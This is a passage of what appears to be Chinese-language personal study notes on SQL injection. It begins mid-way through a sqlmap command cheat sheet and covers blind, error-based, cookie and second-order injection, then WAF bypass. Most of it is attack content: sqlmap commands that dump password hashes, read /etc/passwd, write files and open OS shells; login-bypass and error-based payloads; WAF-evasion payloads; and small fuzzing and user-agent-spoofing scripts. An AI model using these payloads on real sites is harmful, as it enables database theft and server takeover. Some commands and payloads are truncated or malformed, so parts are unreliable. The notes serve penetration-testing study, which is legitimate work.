--os-bof       #<br>
--reg-read     #读取win系统注册表<br>
--priv-esc     #<br>
--time-sec=    #延迟设置 默认--time-sec=5 为5秒<br>
-p &quot;user-agent&quot; --user-agent &quot;sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)&quot;  #指定user-agent注入<br>
--eta          #盲注<br>
/pentest/database/sqlmap/txt/<br>
common-columns.txt　　字段字典　　　<br>
common-outputs.txt<br>
common-tables.txt      表字典<br>
keywords.txt<br>
oracle-default-passwords.txt<br>
user-agents.txt<br>
wordlist.txt</p>
<pre><code>常用语句 :
1./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db --users --passwords --dbs -v 0 
2./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --passwords -U root --union-use -v 2 
3./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -T users -C username -D userdb --start 2 --stop 3 -v 2 
4./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -C &quot;user,pass&quot;  -v 1 --exclude-sysdbs 
5./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --sql-shell -v 2 
6./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-read &quot;c:\boot.ini&quot; -v 2 
7./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-write /test/test.txt --file-dest /var/www/html/1.txt -v 2 
8./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-cmd &quot;id&quot; -v 1 
9./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-shell --union-use -v 2 
10./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 --priv-esc -v 1 
11./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 -v 1 
12./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-bof --msf-path=/opt/framework/msf3 -v 1 
13./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --reg-add --reg-key=&quot;HKEY_LOCAL_NACHINE\SOFEWARE\sqlmap&quot; --reg-value=Test --reg-type=REG_SZ --reg-data=1 
14./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --eta 
15./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot; -p id --prefix &quot;')&quot; --suffix &quot;AND ('abc'='abc&quot;
16./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1&quot; --auth-type Basic --auth-cred &quot;testuser:testpass&quot;
17./sqlmap.py -l burp.log --scope=&quot;(www)?\.target\.(com|net|org)&quot;
18./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot; --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3 
19./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mssql/get_int.php?id=1&quot; --sql-query &quot;SELECT 'foo'&quot; -v 1 
20./sqlmap.py -u &quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot; --common-tables -D testdb --banner 
21./sqlmap.py -u &quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot; --cookie=&quot;PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low&quot; --string='xx' --dbs --level=3 -p &quot;uid&quot;

简单的注入流程 :
1.读取数据库版本，当前用户，当前数据库 
sqlmap -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db -v 1 
2.判断当前数据库用户权限 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --privileges -U 用户名 -v 1 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --is-dba -U 用户名 -v 1 
3.读取所有数据库用户或指定数据库用户的密码 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --users --passwords -v 2 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --passwords -U root -v 2 
4.获取所有数据库 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --dbs -v 2 
5.获取指定数据库中的所有表 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --tables -D mysql -v 2 
6.获取指定数据库名中指定表的字段 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --columns -D mysql -T users -v 2 
7.获取指定数据库名中指定表中指定字段的数据 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --dump -D mysql -T users -C &quot;username,password&quot; -s &quot;sqlnmapdb.log&quot; -v 2 
8.file-read读取web文件 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-read &quot;/etc/passwd&quot; -v 2 
9.file-write写入文件到web 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-write /localhost/mm.php --file使用sqlmap绕过防火墙进行注入测试：

涉及资源
https://www.cnblogs.com/bmjoker/p/9326258.html

http://github.com/youngyangyang04/NoSQLAttack

https://github.com/sqlmapproject/sqlmap/zipball/master

https://blog.csdn.net/qq_39936434/category_9103379.html、
</code></pre>
<h1 id="2021-10-07">2021-10-07</h1>
<p>WEB漏洞-SQL注入之查询方式及报错盲注<br>
当进行SQL注入时，有很多注入会出现无回显的情况，其中不回显的原因可能是SQL语句查询方式的问题导致，这个时候我们需要用到相关的报错或盲注进行后续操作，同时作为手工注入时，提前了解或预知其SQL语句大概写法也能更好地选择对应的注入语句。</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1633661356824.png" alt="" loading="lazy"><br>
补充：Access暴力猜解不出的问题？</p>
<p>Access偏移注入：解决列名获取不到的情况</p>
<p>在已知表名不知列名的前提下（表名admin）</p>
<pre><code>?id=1513 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from admin
</code></pre>
<p>将选取的内容替换为“*”（页面报错）</p>
<pre><code>?id=1513 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,* from admin
</code></pre>
<p>删减选取的内容直到页面正常</p>
<pre><code>?id=1513 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,* from admin

?id=1513 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,* from admin（页面正常）
</code></pre>
<p>所以<code>“*”</code>代替的字符串=22-16=6，说明admin里有6个列</p>
<p><code>“*”</code>后面的内容长度看作和<code>“*”</code>一样，这里剪掉两个<code>“*”</code>的长度</p>
<p>一级偏移语句：</p>
<pre><code>?id=1513 UNION SELECT 1,2,3,4,5,6,7,8,9,10,* from (admin as a inner join admin as b on a.id = b.id)
</code></pre>
<p>查看源代码，会发现随机爆出的数据内容</p>
<p>如果无效尝试二级偏移</p>
<p>二级偏移语句：</p>
<pre><code>?id=1513 UNION SELECT 1,2,3,4,a.id,b.id,c.id,* from ((admin as a inner join admin as b on a.id = b.id)inner join as c on a.id=c.id)
</code></pre>
<p></p>
<p>查看登录框源代码的表单值或观察URL特征等也可以针对表或列获取不到的情况</p>
<p>有时猜解不到是因为表名有前缀，可以通过观察是否存在特定的前缀等来尝试</p>
<p></p>
<p>注入无回显的原因</p>
<p>SQL语句查询方式导致的</p>
<p>未使用显示代码或使用不当导致的</p>
<p></p>
<p>常见SQL语句</p>
<p>select 查询数据</p>
<p>在网站应用中进行数据显示查询操作</p>
<pre><code>select * from news where id=$id
</code></pre>
<p></p>
<p>insert 插入数据</p>
<p>在网站应用中进行用户注册添加等操作</p>
<pre><code>insert into news(id,url,text) values(2,'x','$t')
</code></pre>
<p></p>
<p>delete 删除数据</p>
<p>后台管理里面删除文章删除用户等操作</p>
<pre><code>delete from news where id=$id
</code></pre>
<p></p>
<p>update 更新数据</p>
<p>会员或后台中心数据同步或缓存等操作</p>
<pre><code>update user set pwd='$p' where id=2 and username='admin'
</code></pre>
<p></p>
<p>order by 排列数据</p>
<p>一般结合表名或列名进行数据排序操作</p>
<pre><code>select * from news order by $id

select id,name,price from news order by $order
</code></pre>
<p></p>
<p>重点理解：</p>
<p>我们可以通过以上查询方式与网站应用的关系去猜测注入点产生地方或应用和对方的SQL查询方式。</p>
<p></p>
<p>SQL注入报错盲注</p>
<p>盲注就是在注入过程中，获取的数据不能回显至前端页面。此时，我们需要利用一些方法进行半段或者尝试，这个过程称之为盲注。我们可以知道盲注分为以下三类：</p>
<p></p>
<p>基于布尔的SQL盲注-逻辑判断</p>
<p>regexp，like，ascii，left，ord，mid</p>
<pre><code>?id=1’ and left(database(),2)=’se’--+（正确则页面正常，错误则页面异常）
</code></pre>
<p></p>
<p>基于时间的SQL盲注-延时判断</p>
<pre><code>if，sleep

?id=1 and sleep(if(database()=’pikachu’,5,0))--+

?id=1 and sleep(if(length(database())=8,5,0))--+

?id=1 and sleep(if(mid(database(),1,1)=’s’,5,0))--+

?id=1 and sleep(if(ascii(mid(database(),1,1))=115,5,0))--+

（用ASCII码可以避免引号转义，也方便写脚本）

?id=1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(3),0)--+
</code></pre>
<p></p>
<p>基于报错的SQL盲注-报错回显</p>
<pre><code>floor，updatexml，extractvalue
</code></pre>
<p>https://www.jianshu.com/p/bc35f8dd4f7c</p>
<p>1、通过floor报错,注入语句如下:<br>
and select 1 from (select count(),concat(version(),floor(rand(0)2))x from information_schema.tables group by x)a);</p>
<p>2、通过ExtractValue报错,注入语句如下:<br>
and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));</p>
<p>3、通过UpdateXml报错,注入语句如下:<br>
and 1=(updatexml(1,concat(0x3a,(select user())),1))</p>
<p>4、通过NAME_CONST报错,注入语句如下:<br>
and exists(selectfrom (selectfrom(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c)</p>
<p>5、通过join报错,注入语句如下:<br>
select * from(select * from mysql.user ajoin mysql.user b)c;</p>
<p>6、通过exp报错,注入语句如下:<br>
and exp(~(select * from (select user () ) a) );</p>
<p>7、通过GeometryCollection()报错,注入语句如下:<br>
and GeometryCollection(()select *from(select user () )a)b );</p>
<p>8、通过polygon ()报错,注入语句如下:<br>
and polygon (()select * from(select user ())a)b );</p>
<p>9、通过multipoint ()报错,注入语句如下:<br>
and multipoint (()select * from(select user() )a)b );</p>
<p>10、通过multlinestring ()报错,注入语句如下:<br>
and multlinestring (()select * from(selectuser () )a)b );</p>
<p>11、通过multpolygon ()报错,注入语句如下:<br>
and multpolygon (()select * from(selectuser () )a)b );</p>
<p>12、通过linestring ()报错,注入语句如下:<br>
and linestring (()select * from(select user() )a)b );</p>
<p>关于POST注入<br>
常用的万能username语句：</p>
<pre><code>a ’ or 1=1 #
a &quot;) or 1=1 #
a‘) or 1=1 #
a” or “1”=”1
' or '1'='1
' or (length(database())) = 8 (用于输入’ “都没有错误)
' or (ascii(substr((select database()) ,1,1))) = 115 # (用于输入’ “都没有错误)
&quot;) or (&quot;1&quot;)=(&quot;1
&quot;) or 1=1 or if(1=1, sleep(1), null) #
&quot;) or (length(database())) = 8 #
&quot;) or (ascii(substr((select database()) ,1,1))) = 115 or if(1=1, sleep(1), null) #
</code></pre>
<p>post型盲注通杀payload：<br>
uname=admin%df'or()or%200%23&amp;passwd=&amp;submit=Submit</p>
<p>关于UPDATEXML,REFERER,COOKIE的构造<br>
User-Agent:.........' or updatexml(1,concat(0x7e,database(),0x7e),1),”,”) #<br>
Referer: ’ or updatexml(1,concat(0x7e,database(),0x7e),1),”,”) #<br>
Cookie:username: admin ’ or updatexml(1,concat(0x7e,database(),0x7e),1) #</p>
<p>updatexml报错注入<br>
爆数据库版本信息：?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)<br>
链接用户：?id=1 and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)<br>
链接数据库：?id=1 and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)<br>
爆库：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select schema_name),0x7e) FROM admin limit 0,1),0x7e),1)<br>
爆表：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select table_name),0x7e) FROM admin limit 0,1),0x7e),1)<br>
爆字段：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select column_name),0x7e) FROM admin limit 0,1),0x7e),1)<br>
爆字段内容：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1)</p>
<p>作者：L0ki<br>
链接：https://www.jianshu.com/p/bc35f8dd4f7c<br>
来源：简书<br>
著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>
<p>参考：</p>
<pre><code>like ‘ro%’                        判断ro或ro...是否成立

regexp ‘xiaodi[a-z]’        匹配xiaodi及xiaodi...等

if(条件,5,0)                     条件成立则返回5，反之返回0

sleep(5)                         SQL语句延时执行5秒

mid(a,b,c)                      从位置b开始，截取a字符串的c位

substr(a,b,c)                  从b位置开始，截取字符串a的c长度

left(database(),1),database()    left(a,b)从左侧截取a的前b位

length(database())=8    判断数据库database()名的长度

ord=ascii ascii(x)=97     判断x的ascii码是否等于97
</code></pre>
<p></p>
<p>其他</p>
<p>如果需要在请求行注入，用“+”或“%20”代替空格</p>
<p></p>
<p>涉及资源：</p>
<p>12种报错注入+万能语句：https://www.jianshu.com/p/bc35f8dd4f7c</p>
<p>Order by排序注入方法小总结：https://www.jianshu.com/p/fcae21926e5c</p>
<p>asp+access注入源码：https://pan.baidu.com/s/1IX6emxDpvYrVZbQzJbHn3g 提取码：l9f6 作者：shtome https://www.bilibili.com/read/cv12614611/ 出处：bilibili</p>
<h1 id="2021-10-08">2021-10-08</h1>
<h1 id="web漏洞-二次加解密dns等注入">WEB漏洞-二次,加解密,DNS等注入</h1>
<p>#加解密，二次，DNSlog注入<br>
注入原理，演示案例，实际应用(中转注入)</p>
<p>sqlilabs-less21-cookie&amp;加解密注入<br>
<img src="https://jinqipiaopiao.github.io//post-images/1633663517663.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1633663522462.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1633663525995.png" alt="" loading="lazy"></p>
<p>Decode as base64，把%3D改成=号，得出结果。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1633663529093.png" alt="" loading="lazy"></p>
<p>注入点在cookie，输入' and 1=1 要进行base64加密处理<br>
<img src="https://jinqipiaopiao.github.io//post-images/1633663533785.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1633663538378.png" alt="" loading="lazy"></p>
<p>接收cookie值uname赋予给cookee，对cookee进行base64_decode解码，解码之后带入数据库中。注入语句要还原它的加密方式，把注入语句按照它的加密方式进行加密，然后再提交<br>
<img src="https://jinqipiaopiao.github.io//post-images/1633663552278.png" alt="" loading="lazy"></p>
<p>演示</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1633663556536.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1633663561681.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1633663566406.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1633663571256.png" alt="" loading="lazy"></p>
<p>实例</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1633663579757.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1633663588120.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1633663593531.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1633663598992.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1633663603030.png" alt="" loading="lazy"></p>
<p><strong>sqlilabs-less24-post登录框&amp;二次注入</strong><br>
二次注入无法通过扫描工具或者代码自己手工测试出来的，二次注入一般会产生在网站程序源代码才会发现的注入漏洞，从前端或者黑盒测试是看不到这个漏洞。<br>
二次注入原理，主要分为两步：<br>
第一步：插入恶意数据<br>
第一次进行数据库插入数据的时候，仅仅对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身包含恶意内容。<br>
第二步：引用恶意数据<br>
在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次需要进行查询的时候，直接从数据库中取出了恶意数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。</p>
<figure data-type="image" tabindex="14"><img src="https://jinqipiaopiao.github.io//post-images/1633663608196.png" alt="" loading="lazy"></figure>
<p>注册新用户</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1633663707056.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1633663620349.png" alt="" loading="lazy"></p>
<p>登录进行修改密码界面，把原始密码123456修改成xxxxxx</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1633663714025.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1633663719957.png" alt="" loading="lazy"></p>
<p>修改完成，查看数据库，修改密码的账号为dhakkan</p>
<figure data-type="image" tabindex="15"><img src="https://jinqipiaopiao.github.io//post-images/1633663725446.png" alt="" loading="lazy"></figure>
<p>查看源码</p>
<figure data-type="image" tabindex="16"><img src="https://jinqipiaopiao.github.io//post-images/1633663739786.png" alt="" loading="lazy"></figure>
<p>插入语句中是没有单引号的，所以不会屏蔽，后来修改密码用的是update语句，这个语句有单引号。</p>
<p><strong>sqlilabs-less9-load_file&amp;dnslog带外注入</strong></p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1633663748466.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1633663754245.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1633663759018.png" alt="" loading="lazy"></p>
<p><strong>py-DnslogSqlinj-dnslog诸如演示脚本演示</strong><br>
工具：https://github.com/ADOOO/DnslogSqlinj</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1633663764881.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1633663772649.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1633663778378.png" alt="" loading="lazy"></p>
<p><strong>py-DnslogSqlinj-dnslog诸如演示脚本演示</strong><br>
工具：https://github.com/ADOOO/DnslogSqlinj</p>
<h1 id="web漏洞-sql注入之堆叠及waf绕过注入">WEB漏洞-SQL注入之堆叠及WAF绕过注入</h1>
<figure data-type="image" tabindex="17"><img src="https://jinqipiaopiao.github.io//post-images/1633665500039.png" alt="" loading="lazy"></figure>
<p>** 堆叠查询注入**<br>
Stacked injections(堆叠注入)从名词的含义就可以看到应该是一堆sql语句(多条)一起执行。而在真实的运用中也是这样的，我们知道在mysql中，主要是命令行中，每一条语句结尾加;表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做stacked injection。<br>
堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎的不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些数据。</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1633665505654.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1633665508860.png" alt="" loading="lazy"></p>
<p><strong>Sqlilabs-Less38-堆叠注入(多语句)</strong></p>
<pre><code>http://127.0.0.1/sqli-labs/Less-38/?id=1';insert into users(id,username,password) values ('38','less38','hello')--+
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1633665512922.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1633665517183.png" alt="" loading="lazy"></p>
<p>注入需要管理员账号密码，密码是加密，无法解密，使用堆叠注入进行插入数据，用户密码自定义的，可以正常解密登录。<br>
mtype:会员类别</p>
<figure data-type="image" tabindex="18"><img src="https://jinqipiaopiao.github.io//post-images/1633665522600.png" alt="" loading="lazy"></figure>
<p>WAF部署-安全狗，宝塔等waf搭建部署<br>
不是拦截部分，是拦截database()整体<br>
<img src="https://jinqipiaopiao.github.io//post-images/1633665527093.png" alt="" loading="lazy"><br>
绕过思路：拆分<br>
Mysql特有注释符<br>
<img src="https://jinqipiaopiao.github.io//post-images/1633665531452.png" alt="" loading="lazy"><br>
GET提交方式拦截，union select联合查询被拦截<br>
<img src="https://jinqipiaopiao.github.io//post-images/1633665534655.png" alt="" loading="lazy"></p>
<pre><code>在mysql的语法中，有三种注释方法：--
和#（单行注释）和 /* */（多行注释）如果在/*后加惊叹号!意为/* */里的语句将被执行
在mysql中 /*! ....*/ 不是注释，mysql为了保持兼容，它把一些特有的仅在mysql上用的语句放在/*!....*/中，这样这些语句如果在其他数据库中是不会被执行，但在mysql中它会执行。如下语句/*!50001 select * from test */;这里的50001表示假如 数据库是5.00.01及以上版本，该语句才会被执行。
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1633665539620.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1633665544783.png" alt="" loading="lazy"></p>
<p>phostudy+safedog安装找不到服务解决<br>
市面上常见的waf产品列表分析-wafw00f<br>
部分bypass sqlinject payload</p>
<pre><code>id=1 union/*%00*/%23a%0a/*!/*!select 1,2,3*/;%23
id=1 union/*%00*/%23a%0a/*!/*!select%201,database%23x%0A(),3*/;%23

id=-1%20union%20/*!44509select*?%201,2,3%23
id=-1%20union%20/*!44509select*?%201,%23x%0A/*!database*?(),3%23

id=1?**&amp;id=-1%20union%20select%201,2,3%23*/

id=-1 %20union%20all%23%0a%20select%201,2,3%23
-1 %20union%20all%23%0a%20select%201,%230%0Adatabase/**/(),3%23
</code></pre>
<p>市面上常见的waf产品列表 - wafw00f<br>
阿里云盾，安全狗，阿里云盾<br>
遇到WAF先手测，工具一扫就会封IP。<br>
测试绕过就是研究哪方面没有进行过滤</p>
<p>提交方式绕过WAF，前提支持各种方式的接受</p>
<p>（等价函数，特殊函数）：既需要绕过匹配规则，还要不干扰语句的运行结果。</p>
<p>反序列化的格式进行绕过，注释符混用</p>
<p>%0a换行  %23注释#<br>
部分bypass sqlinject payload<br>
特殊符号，换行绕狗子<br>
id = 1 union %23a%0A select 1,2,3 #<br>
匹配到union然后注释，安全认为句子结束，  union a select 狗子不会拦截<br>
union #a                         写#屏蔽a，换行让union select执行<br>
select 1,2,3 #</p>
<pre><code>  注释符混用，参数污染绕狗子
		

		参数污染只接受后面的，?id=1/**&amp;id=-1 unio select 1,2,3 #*/              /***/ SQL里面的注释符
			1/**&amp;id=-1 unio select 1,2,3 #*/        狗子接收的
			-1 unio select 1,2,3 #*/       执行的语句  （内联注释）
			狗子匹配第一条，其中的注释符号起到注释作用，正常情况没法执行，安全狗直接忽略，
			参数污染导致的真实数据是执行的语句，能够正常执行SQL语句
</code></pre>
<p>fuzz模糊测试，类似爆破密码。某个点生成字典，不断测试。写好脚本和字典批量化进行测试</p>
<pre><code>	import request
	import time
	
	
	url = 'http://1.1.1.1/sqli-labs/less2/?id=1'
	for sqlin in open('uniobselect.txt')
		urls = url + sqlin
		result = requests.get(urls).text
		if (result.find('safedog')==-1):
			print(sqlin)
		time.sleep(-1)
</code></pre>
<p>堆叠注入详解：https://www.cnblogs.com/backlion/p/9721687.html</p>
<p>应用层<br>
大小写/关键字替换<br>
id=1 UnIoN/<strong>/SeLeCT 1,user()<br>
hex() bin() 等价于ascii<br>
sleep()等价于benchmark()<br>
Mid()substring() 等价于 substr()<br>
@@user() 等价于User()<br>
@@version等价于version()<br>
各种编码：<br>
大小写,URL,hex,%0A等<br>
注释使用：<br>
// --  --+ # /</strong>/ + :%00 /!**/等<br>
再次循环<br>
union==uunionnion<br>
等价替换：<br>
user()=@@user() and=&amp; or=| ascii=hex等<br>
参数污染：<br>
?id=1&amp;id=2&amp;id=3<br>
编码及解码：<br>
s-&gt;%73-&gt;%25%37%33<br>
更改请求提交方式：<br>
GET,POST,COOKIE<br>
POST-&gt;multipart/from-data</p>
<pre><code>中间件参数污染
</code></pre>
<p>数据库特性：<br>
1.mysql技巧</p>
<pre><code>	（1）mysql注释有三种，#，/*...*/,-- ... （--后加空格）
	 （2）空格符：0x9a,0x0a-0x0d,0x20,0xa0
	 (3)特殊符号 0a%换行符
		可结合注释符使用 %23%0a，%2d%2d%0a
	 （4）内联注释
		/*! union12345select*/ 1,user()   //数字范围1000-50540
	  （5）mysql黑语法
		 select {x username} from {x11 test.admin};
</code></pre>
<p>2.sqlsever</p>
<pre><code>	 (1)用来注释掉后查询的其余部分
		/*   c语言风格注释
		-- sql注释
		；00%空字节
	  (2)空白符：[0x01-0x20]
	 (3)特殊符号：%3a  冒号
		id = 1 union:select 1,2 from:admin
	(4)函数变型：如db_name [空白字符]（）
</code></pre>
<p>3.oracle技巧</p>
<pre><code>(1) 注释符：--，/**/
(2) 空白字符：[0x00,0x09,0x0a-0x0d,0x20]

4.配合fuzz
select * from admin where id=1 [位置一] union [位置二] select [位置三] 1,2，db_name() [位置四] from [位置五] admin
</code></pre>
<p>逻辑层<br>
（1）云waf防护，一般我们会尝试查找真实站点的真实ip，从而绕过CDN防护<br>
（2）当提交，GET，POST同时请求时，进入POST逻辑，而忽略了GET请求的有害参数输入，可尝试bypass，<br>
（3）http和https同时开放服务，没有做http到https的强制跳转，导致https有waf防护，http没有防护，直接访问http站点绕过防护<br>
（4）特殊符号%00，部分waf遇到%00截断，只能获取到前面的参数，无法获取到后面的有害输入，从而导致bypass<br>
比如：id=1%00and 1=2 union select 1,2,column_name from imformation_schema.columns<br>
白名单<br>
方式一：ip白名单</p>
<pre><code>		从网络层获取来的ip，是无法伪造的，如果获取客户端的ip，这样就可能存在伪造ip绕过的情况。
		
		测试方法：
			修改http的header来bypass waf
			x-forwarded-for
			x-remote-ip
			x-originating-ip
			x-remote-addr
			x-real-ip
</code></pre>
<p>方式二：静态资源</p>
<pre><code>			特定的后缀资源静态请求，常见的静态文件，（.js  .jpg  .swf  .css 等），类似白名单机制，
			waf为了检测效率，不去检测这样一些静态文件后缀的请求。
</code></pre>
<p>方式三：url白名单</p>
<pre><code>			为了防止误拦截，部分waf内置默认的白名单列表，如admin/manager/system等管理后台。只要url中存在的白名单的字符，就作为白名单不检测。
</code></pre>
<p>方式四：爬虫白名单</p>
<pre><code>			部分waf对爬虫结果会忽略，waf如果识别出了搜索引擎来爬虫，waf就会放行
		
				import json
				import request
				
				url = 'http://1.1.1.1:8080'
				head={
					'user-agent':'mozilla/5.0(compatible;badiduspider-render/2.0;)'
				}
				for data in open(&quot;php.txt&quot;):
					data = data.replace('\n','')
					urls=url+data
					code=requests.get(urls,headers=head).status_code
					print(urls+'|'+str(code))    
</code></pre>
<h1 id="2021-10-09">2021-10-09</h1>
<h1 id="sql注入之sqlmap绕过waf">SQL注入之SQLMAP绕过WAF</h1>
<p><img src="https://jinqipiaopiao.github.io//post-images/1633745600331.png" alt="" loading="lazy"><br>
<strong>方式一：IP白名单</strong><br>
通过对网站ip地址的伪造，知道对方网站ip地址，那就默认为ip地址为白名单。<br>
从网络层获取的ip，这种一般伪造不来，如果是获取客户端的ip，这样就饿可能存在伪造ip绕过的情况。<br>
测试方法：修改http的header来by pass waf<br>
X-forwarded-for<br>
X-remote-IP<br>
X-remote-addr<br>
X-Real-IP</p>
<p><strong>方式二：静态资源</strong><br>
特定的静态资源后缀请求，常见的静态文件(.js、.jpg、.swf、.css等），类似白名单机制，waf为了检测效率，不去检测这样一些静态文件名后缀的请求。<br>
http://10.9.9.201/sql.php?id=1<br>
http://10.9.9.201/sql.php/1.js?id=1<br>
备注：Aspx/php只识别到前面的.aspx/.php，后面基本不识别。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1633745608077.png" alt="" loading="lazy"><br>
<strong>方式三：url白名单</strong><br>
为了防止误拦，部分waf内置默认的白名单列表，如admin/manager/system等管理后台。只要url中存在白名单的字符串，就作为白名单不进行检测。常见的url构造姿势：<br>
http://10.9.9.201/sql.php/admin/php?id=1<br>
http://10.9.9.201/sql.php?a=/manage/&amp;b=../etc/passwd<br>
http://10.9.9.201/../../../manage/../sql.asp?id=2<br>
waf通过/manage/进行比较，只要url中存在/manage/就作为白名单不进行检测，这样我们可以通过/sql.php?1=manage/&amp;b=../etc/passwd绕过防御规则。</p>
<p><strong>方式四：爬虫白名单</strong><br>
部分waf有提供爬虫白名单的功能，识别爬虫的技术一般有两种：<br>
1.根据UserAgent<br>
2.通过行为来判断<br>
UserAgent可以很容易欺骗，我们可以伪装成爬虫尝试绕过。<br>
User Agent Switcher (firefox 附加组件)，下载地址：<br>
https://addons.mozilla.org/en-US/firefox/addon/user-agent-switcher/<br>
伪造成百度爬虫<br>
<img src="https://jinqipiaopiao.github.io//post-images/1633745612766.png" alt="" loading="lazy"><br>
知识点<br>
市面上常见的 waf 产品列表分析-wafw00f<br>
​ 阿里云盾，安全狗，宝塔</p>
<p>部分 bypass sqlinject payload<br>
原理：</p>
<pre><code>?id= 1 union %23a%0A select 1,2,3 
</code></pre>
<p>其实是<br>
union #a                         //写#闭合a，%0A换行让union select执行<br>
select 1,2,3</p>
<p>安全狗匹配到union接着注释，安全狗认为句子结束<br>
为防止安全狗继续读取下去，<strong>加上a来干扰</strong>，从而达到了绕过思路<br>
<strong>union a select 狗子不会拦截</strong></p>
<pre><code>id=1 union/*%00*/%23a%0A/*!/*!select 1,2,3*/;%23

id=-1 union/*%00*/%23a%0A/*!/*!select%201,database%23x%0A(),3*/;%23

id=-1%20union%20/*!44509select*/%201,2,3%23

id=-1%20union%20/*!44509select*/%201,%23x%0A/*!database*/(),3%23id=1/**&amp;id=-1%20union%20select%201,2,3%23*/

id=-1 %20union%20all%23%0a%20select%201,2,3%23

-1 %20union%20all%23%0a%20select%201,%230%0Adatabase/**/(),3%23

